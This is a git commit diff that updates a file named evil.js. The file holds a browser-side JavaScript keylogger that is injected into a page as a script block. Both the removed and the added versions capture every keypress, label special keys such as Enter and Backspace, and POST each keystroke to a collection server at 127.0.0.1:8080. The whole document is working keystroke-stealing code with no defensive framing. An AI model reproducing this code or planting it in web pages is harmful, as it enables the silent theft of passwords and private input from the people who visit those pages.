a545a825aba624fbb802a1843d8feef3d53473be
MGF15 <mohamed5548@live.com>
2016-07-20 20:30:14 +0300

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,13 +1,34 @@
 <script>
-    document.onkeypress = function(evt) {
-       evt = evt || window.event
-       key = String.fromCharCode(evt.charCode)
-       if (key) {
-          var http = new XMLHttpRequest();
-          var param = encodeURI(key)
-          http.open("POST","http://127.0.0.1:8080/"+"key="+param,true);
-          http.send(null);
-       }
-    }
-
+    document.onkeypress = function KeyPress(e){
+    var key;
+	var u;
+	var http = new XMLHttpRequest();
+	e = e.which || e.keyCode;
+	if(e) {             
+		key = e
+	}
+	u = key;
+ 	switch (key) {
+		case 32:
+			u = "[Space]";
+			break;
+		case 13:
+			u = "[Enter]";
+			break;
+		case 9:
+			u = "[Tab]";
+			break;
+		case 8:
+			u = "[Backspace]";
+	}
+    if (u===parseInt(key, 10)){
+		u = String.fromCharCode(key)
+		ky = u;
+	}
+	else {
+		ky = u;
+	}
+	http.open("POST","http://127.0.0.1:8080/"+"key="+decodeURI(ky),true);
+	http.send(null);
+}
 </script>
